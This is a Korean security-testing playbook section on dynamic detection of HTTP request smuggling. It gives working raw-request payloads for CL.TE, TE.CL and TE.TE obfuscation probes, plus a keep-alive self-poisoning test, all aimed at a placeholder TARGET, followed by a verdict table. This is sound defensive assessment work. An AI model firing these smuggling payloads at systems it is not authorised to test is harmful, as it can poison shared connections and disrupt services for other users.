### Phase 2: 동적 테스트 (검증)

**중요: HTTP Smuggling은 소스코드에 프록시 설정 파일이 없더라도 동적 테스트를 반드시 수행한다.** 프록시/로드밸런서 설정은 대부분 인프라 레벨에서 관리되어 소스코드에 포함되지 않으므로, 소스코드 분석만으로 "해당 없음"으로 판단하지 않는다. 테스트 환경 URL이 제공되어 있으면 항상 동적 테스트를 진행한다.

#### 필수 동적 테스트 항목

테스트 환경 URL이 있으면 다음 테스트를 **모두** 수행한다. 각 테스트의 응답 시간과 HTTP 상태 코드를 기록한다.

**1. 기준선 측정:**
```bash
# 정상 요청의 응답 시간 측정
START=$(date +%s%N)
printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n' | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null | head -3
END=$(date +%s%N)
echo "Baseline: $(( ($END - $START) / 1000000 ))ms"
```

**2. CL.TE 시간 기반 탐지:**
```bash
# 프론트엔드=CL, 백엔드=TE일 때 불완전한 청크가 타임아웃 유발
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ' | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null
# 정상이면 즉시 응답 (<100ms), 취약하면 타임아웃 (5s+)
```

**3. TE.CL 시간 기반 탐지:**
```bash
# 프론트엔드=TE, 백엔드=CL일 때 잔여 데이터가 다음 요청으로 해석
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null
```

**4. TE.TE Obfuscation 변형 (각각 시간 측정):**
```bash
# 4-1. Space before colon
Transfer-Encoding : chunked

# 4-2. Tab separator
Transfer-Encoding:\tchunked

# 4-3. Substring match
Transfer-Encoding: xchunked

# 4-4. Duplicate headers
Transfer-Encoding: chunked\r\nTransfer-Encoding: x

# 4-5. Leading space in value
Transfer-Encoding:  chunked
```

각 변형에 대해 CL.TE 패턴으로 시간 기반 탐지를 수행한다:
```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n1\r\nZ\r\nQ' | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null
```

**5. CL+TE 충돌 처리 확인 (curl):**
```bash
# 서버가 CL+TE 동시 존재를 어떻게 처리하는지 확인
# 400 거부 = 안전 (프록시가 차단), 200 = 추가 조사 필요
curl -s -w "\nHTTP_CODE:%{http_code}\ntime_total:%{time_total}" -X POST "https://TARGET/" \
  -H "Content-Length: 6" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nX"
```

**6. Self-poisoning 확인 (keep-alive 연결):**
```bash
# 같은 커넥션에서 밀수 시도 + 후속 요청을 전송하여 두 번째 응답이 영향받는지 확인
(printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /nonexistent HTTP/1.1\r\nHost: TARGET\r\n\r\n'; sleep 0.5; printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n') | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null | grep "^HTTP/"
# 두 번째 응답이 404이면 밀수 성공
```

#### 판정 기준

| 결과 | 판정 |
|------|------|
| CL+TE 동시 전송 시 400 Bad Request | 안전 — 프록시가 충돌을 감지하여 차단 |
| 시간 기반 테스트에서 5초+ 지연 (기준선 대비) | **취약 가능** — 추가 self-poisoning 확인 필요 |
| Self-poisoning으로 두 번째 응답이 영향받음 | **확인됨** |
| TE obfuscation 변형에서만 지연 발생 | **확인됨** (TE.TE 취약) |
| 모든 테스트에서 즉시 응답 + 400 거부 | 안전 |

**검증 기준:**
- **확인됨**: 동적 테스트로 요청 경계 불일치가 확인됨 (시간 지연 발생, 또는 밀수된 요청의 응답이 확인됨)
- **후보**: 시간 기반 테스트에서 미미한 지연이 관찰되었으나 self-poisoning으로 최종 확인하지 못한 경우
- **"확인됨"은 동적 테스트를 통해서만 부여할 수 있다**: 소스코드 분석만으로는 아무리 취약해 보여도 "확인됨"으로 보고하지 않는다. 동적 테스트로 실제 트리거를 확인한 경우에만 "확인됨"이다. 동적 테스트를 수행하지 않았으면 모든 결과는 "후보"이다.
- **보고서 제외 (안전)**: 모든 테스트에서 즉시 응답하고 CL+TE 충돌 시 400으로 거부되는 경우
